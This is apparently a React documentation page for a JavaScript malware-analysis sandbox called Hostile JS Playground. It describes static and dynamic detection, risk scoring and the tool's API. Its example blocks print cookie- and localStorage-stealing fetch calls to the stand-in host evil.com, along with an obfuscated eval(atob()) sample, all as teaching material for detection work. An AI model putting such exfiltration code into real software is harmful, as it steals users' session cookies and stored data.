import { useState } from "react";
import {
  Book,
  Shield,
  Code,
  Zap,
  Globe,
  Eye,
  AlertTriangle,
  ChevronRight,
  ExternalLink,
  Download,
} from "lucide-react";

const Documentation = () => {
  const [activeSection, setActiveSection] = useState("overview");

  const sections = [
    { id: "overview", title: "Overview", icon: Book },
    { id: "getting-started", title: "Getting Started", icon: Zap },
    { id: "analysis-engine", title: "Analysis Engine", icon: Shield },
    { id: "threat-detection", title: "Threat Detection", icon: AlertTriangle },
    { id: "api-reference", title: "API Reference", icon: Code },
    { id: "examples", title: "Examples", icon: Eye },
  ];

  const renderContent = () => {
    switch (activeSection) {
      case "overview":
        return (
          <div className="space-y-6">
            <h2 className="text-2xl font-bold text-white">Overview</h2>
            <p className="text-slate-300 leading-relaxed">
              Hostile JS Playground is a comprehensive platform for analyzing
              and detecting malicious JavaScript behavior. It provides both
              static and dynamic analysis capabilities in a secure, sandboxed
              environment.
            </p>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
                <Shield className="w-8 h-8 text-blue-400 mb-3" />
                <h3 className="text-lg font-semibold text-white mb-2">
                  Static Analysis
                </h3>
                <p className="text-slate-400 text-sm">
                  Pattern-based detection of malicious code structures,
                  obfuscation techniques, and suspicious API usage.
                </p>
              </div>
              <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
                <Zap className="w-8 h-8 text-yellow-400 mb-3" />
                <h3 className="text-lg font-semibold text-white mb-2">
                  Dynamic Analysis
                </h3>
                <p className="text-slate-400 text-sm">
                  Real-time behavior monitoring in an instrumented sandbox
                  environment with comprehensive logging.
                </p>
              </div>
            </div>

            <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4">
              <h4 className="text-blue-400 font-medium mb-2">Key Features</h4>
              <ul className="text-slate-300 text-sm space-y-1">
                <li>• Real-time threat detection and scoring</li>
                <li>• Comprehensive behavior analysis</li>
                <li>• Educational challenge system</li>
                <li>• RESTful API for integration</li>
                <li>• Detailed execution logs and timelines</li>
              </ul>
            </div>
          </div>
        );

      case "getting-started":
        return (
          <div className="space-y-6">
            <h2 className="text-2xl font-bold text-white">Getting Started</h2>

            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-white">Quick Start</h3>
              <ol className="text-slate-300 space-y-3">
                <li className="flex items-start space-x-3">
                  <span className="bg-blue-500 text-white rounded-full w-6 h-6 flex items-center justify-center text-sm font-medium">
                    1
                  </span>
                  <div>
                    <strong>Write JavaScript Code:</strong> Use the code editor
                    to write or paste JavaScript code you want to analyze.
                  </div>
                </li>
                <li className="flex items-start space-x-3">
                  <span className="bg-blue-500 text-white rounded-full w-6 h-6 flex items-center justify-center text-sm font-medium">
                    2
                  </span>
                  <div>
                    <strong>Execute & Analyze:</strong> Click the "Execute &
                    Analyze" button to run the code in our secure sandbox.
                  </div>
                </li>
                <li className="flex items-start space-x-3">
                  <span className="bg-blue-500 text-white rounded-full w-6 h-6 flex items-center justify-center text-sm font-medium">
                    3
                  </span>
                  <div>
                    <strong>Review Results:</strong> Examine the analysis
                    results, including risk score, detected behaviors, and
                    execution logs.
                  </div>
                </li>
              </ol>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h4 className="text-lg font-semibold text-white mb-3">
                Example Malicious Code
              </h4>
              <pre className="bg-slate-900 rounded p-4 text-sm text-slate-300 overflow-x-auto">
                {`// Data exfiltration example
document.cookie = "stolen=credentials";
fetch("https://evil.com/exfiltrate", {
  method: "POST",
  body: JSON.stringify({
    data: localStorage.getItem("sensitive"),
    cookies: document.cookie
  })
});

// Obfuscated code execution
eval(atob("Y29uc29sZS5sb2coJ21hbGljaW91cycpOw=="));`}
              </pre>
            </div>
          </div>
        );

      case "analysis-engine":
        return (
          <div className="space-y-6">
            <h2 className="text-2xl font-bold text-white">Analysis Engine</h2>

            <div className="space-y-6">
              <div>
                <h3 className="text-xl font-semibold text-white mb-3">
                  Static Analysis
                </h3>
                <p className="text-slate-300 mb-4">
                  Our static analysis engine examines code without execution,
                  looking for patterns and structures commonly associated with
                  malicious behavior.
                </p>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="bg-slate-800/50 rounded-lg p-4 border border-slate-700">
                    <h4 className="font-medium text-white mb-2">
                      Pattern Detection
                    </h4>
                    <ul className="text-slate-400 text-sm space-y-1">
                      <li>• Dynamic code evaluation (eval, Function)</li>
                      <li>• Network request patterns</li>
                      <li>• DOM manipulation techniques</li>
                      <li>• Data access patterns</li>
                    </ul>
                  </div>
                  <div className="bg-slate-800/50 rounded-lg p-4 border border-slate-700">
                    <h4 className="font-medium text-white mb-2">
                      Obfuscation Analysis
                    </h4>
                    <ul className="text-slate-400 text-sm space-y-1">
                      <li>• String encoding detection</li>
                      <li>• Code complexity analysis</li>
                      <li>• Character entropy calculation</li>
                      <li>• Identifier obfuscation</li>
                    </ul>
                  </div>
                </div>
              </div>

              <div>
                <h3 className="text-xl font-semibold text-white mb-3">
                  Dynamic Analysis
                </h3>
                <p className="text-slate-300 mb-4">
                  Dynamic analysis executes code in a controlled sandbox
                  environment with comprehensive instrumentation.
                </p>
                <div className="bg-slate-800/50 rounded-lg p-4 border border-slate-700">
                  <h4 className="font-medium text-white mb-2">
                    Monitored APIs
                  </h4>
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm text-slate-400">
                    <div>
                      <strong className="text-white">Network</strong>
                      <ul className="mt-1 space-y-1">
                        <li>• fetch()</li>
                        <li>• XMLHttpRequest</li>
                        <li>• WebSocket</li>
                      </ul>
                    </div>
                    <div>
                      <strong className="text-white">Storage</strong>
                      <ul className="mt-1 space-y-1">
                        <li>• localStorage</li>
                        <li>• sessionStorage</li>
                        <li>• document.cookie</li>
                      </ul>
                    </div>
                    <div>
                      <strong className="text-white">DOM</strong>
                      <ul className="mt-1 space-y-1">
                        <li>• document.write</li>
                        <li>• innerHTML</li>
                        <li>• createElement</li>
                      </ul>
                    </div>
                    <div>
                      <strong className="text-white">Timing</strong>
                      <ul className="mt-1 space-y-1">
                        <li>• setTimeout</li>
                        <li>• setInterval</li>
                        <li>• performance.now</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        );

      case "threat-detection":
        return (
          <div className="space-y-6">
            <h2 className="text-2xl font-bold text-white">Threat Detection</h2>

            <div className="space-y-6">
              <div>
                <h3 className="text-xl font-semibold text-white mb-3">
                  Threat Categories
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {[
                    {
                      name: "Network Requests",
                      icon: Globe,
                      color: "text-blue-400",
                      desc: "Unauthorized data transmission",
                    },
                    {
                      name: "Data Exfiltration",
                      icon: Shield,
                      color: "text-red-400",
                      desc: "Stealing sensitive information",
                    },
                    {
                      name: "Dynamic Evaluation",
                      icon: Zap,
                      color: "text-yellow-400",
                      desc: "Runtime code execution",
                    },
                    {
                      name: "Obfuscation",
                      icon: Eye,
                      color: "text-purple-400",
                      desc: "Code hiding techniques",
                    },
                  ].map((threat) => (
                    <div
                      key={threat.name}
                      className="bg-slate-800/50 rounded-lg p-4 border border-slate-700"
                    >
                      <div className="flex items-center space-x-3 mb-2">
                        <threat.icon className={`w-5 h-5 ${threat.color}`} />
                        <h4 className="font-medium text-white">
                          {threat.name}
                        </h4>
                      </div>
                      <p className="text-slate-400 text-sm">{threat.desc}</p>
                    </div>
                  ))}
                </div>
              </div>

              <div>
                <h3 className="text-xl font-semibold text-white mb-3">
                  Risk Scoring
                </h3>
                <p className="text-slate-300 mb-4">
                  Our risk scoring algorithm considers multiple factors to
                  provide an accurate threat assessment.
                </p>
                <div className="bg-slate-800/50 rounded-lg p-4 border border-slate-700">
                  <h4 className="font-medium text-white mb-3">
                    Scoring Factors
                  </h4>
                  <div className="space-y-2 text-sm">
                    <div className="flex justify-between">
                      <span className="text-slate-300">Severity Weights:</span>
                      <span className="text-slate-400">
                        Critical (25), High (15), Medium (8), Low (3), Info (1)
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-300">Behavior Types:</span>
                      <span className="text-slate-400">
                        Network, evaluation, obfuscation multipliers
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-300">
                        Pattern Complexity:
                      </span>
                      <span className="text-slate-400">
                        Code structure and obfuscation level
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        );

      case "api-reference":
        return (
          <div className="space-y-6">
            <h2 className="text-2xl font-bold text-white">API Reference</h2>

            <div className="space-y-6">
              <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
                <h3 className="text-lg font-semibold text-white mb-3">
                  POST /api/analysis/execute
                </h3>
                <p className="text-slate-300 mb-4">
                  Execute and analyze JavaScript code
                </p>

                <div className="space-y-4">
                  <div>
                    <h4 className="font-medium text-white mb-2">
                      Request Body
                    </h4>
                    <pre className="bg-slate-900 rounded p-3 text-sm text-slate-300 overflow-x-auto">
                      {`{
  "code": "console.log('Hello World');",
  "options": {
    "timeout": 5000,
    "memoryLimit": 50
  }
}`}
                    </pre>
                  </div>

                  <div>
                    <h4 className="font-medium text-white mb-2">Response</h4>
                    <pre className="bg-slate-900 rounded p-3 text-sm text-slate-300 overflow-x-auto">
                      {`{
  "success": true,
  "result": {
    "id": "uuid",
    "riskScore": 25,
    "behaviors": [...],
    "logs": [...],
    "executionTime": 150
  }
}`}
                    </pre>
                  </div>
                </div>
              </div>

              <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
                <h3 className="text-lg font-semibold text-white mb-3">
                  GET /api/challenges
                </h3>
                <p className="text-slate-300 mb-4">
                  Retrieve available security challenges
                </p>

                <div>
                  <h4 className="font-medium text-white mb-2">Response</h4>
                  <pre className="bg-slate-900 rounded p-3 text-sm text-slate-300 overflow-x-auto">
                    {`{
  "success": true,
  "challenges": [
    {
      "id": "challenge-1",
      "title": "Cookie Stealer",
      "difficulty": "beginner",
      "maxScore": 100
    }
  ]
}`}
                  </pre>
                </div>
              </div>
            </div>
          </div>
        );

      case "examples":
        return (
          <div className="space-y-6">
            <h2 className="text-2xl font-bold text-white">Examples</h2>

            <div className="space-y-6">
              {[
                {
                  title: "Cookie Theft",
                  description:
                    "Example of malicious cookie access and exfiltration",
                  code: `// Steal and exfiltrate cookies
const stolenData = document.cookie;
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify({ cookies: stolenData })
});`,
                },
                {
                  title: "Obfuscated Eval",
                  description: "Base64 encoded malicious code execution",
                  code: `// Obfuscated malicious code
const encoded = "Y29uc29sZS5sb2coJ21hbGljaW91cycpOw==";
eval(atob(encoded));`,
                },
                {
                  title: "Timing Attack",
                  description: "High-frequency timing for fingerprinting",
                  code: `// Timing-based fingerprinting
const start = performance.now();
for(let i = 0; i < 1000; i++) {
  Math.random();
}
const timing = performance.now() - start;`,
                },
              ].map((example, index) => (
                <div
                  key={index}
                  className="bg-slate-800/50 rounded-lg p-6 border border-slate-700"
                >
                  <h3 className="text-lg font-semibold text-white mb-2">
                    {example.title}
                  </h3>
                  <p className="text-slate-400 mb-4">{example.description}</p>
                  <pre className="bg-slate-900 rounded p-4 text-sm text-slate-300 overflow-x-auto">
                    {example.code}
                  </pre>
                </div>
              ))}
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <div className="max-w-6xl mx-auto">
      <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
        {/* Sidebar */}
        <div className="lg:col-span-1">
          <div className="bg-slate-800/50 rounded-lg border border-slate-700 p-4 sticky top-6">
            <h3 className="text-lg font-semibold text-white mb-4">
              Documentation
            </h3>
            <nav className="space-y-2">
              {sections.map((section) => (
                <button
                  key={section.id}
                  onClick={() => setActiveSection(section.id)}
                  className={`w-full flex items-center space-x-3 px-3 py-2 rounded-lg text-left transition-all duration-300 menu-item-hover ${
                    activeSection === section.id
                      ? "bg-blue-500/20 text-blue-400 border border-blue-500/30"
                      : "text-slate-400 hover:text-white border border-transparent hover-bg-primary"
                  }`}
                >
                  <section.icon className="w-4 h-4" />
                  <span className="text-sm">{section.title}</span>
                  {activeSection === section.id && (
                    <ChevronRight className="w-4 h-4 ml-auto" />
                  )}
                </button>
              ))}
            </nav>
          </div>
        </div>

        {/* Content */}
        <div className="lg:col-span-3">
          <div className="bg-slate-800/50 rounded-lg border border-slate-700 p-6">
            {renderContent()}
          </div>
        </div>
      </div>
    </div>
  );
};

export default Documentation;
